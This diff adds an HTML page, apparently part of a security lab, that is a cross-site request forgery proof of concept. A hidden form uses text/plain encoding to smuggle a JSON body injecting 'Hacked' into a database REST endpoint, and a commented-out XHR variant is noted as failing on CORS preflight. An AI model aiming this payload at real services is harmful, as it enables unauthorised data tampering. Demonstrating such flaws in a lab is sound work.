@@ -1,0 +1,22 @@
+
+<!DOCTYPE html>
+<html lang="en-US">
+<body>
+
+    <form id="command" action="http://<%= node['ec2']['public_ipv4'] %>:80/api/db-service/rest/db/add" method="post" enctype="text/plain">
+        <input type="hidden" name='{"quotes": ["Hacked"], "ignore": "' value='test"}'>
+        <input value="CLICK ME" type="submit">
+    </form>
+
+    <!--<script>
+	var http = new XMLHttpRequest();
+	var url = "http://localhost:80/api/db-service/rest/db/add";
+	var params = '{"quotes": ["Hacked_comment_thread"]}';
+	http.open("post",url,true);
+	http.setRequestHeader("content-type", "application/json");
+	http.send(params);
+    </script> 
+    Fails due to server not responding with proper headers from preflight request-->
+
+</body>
+</html>
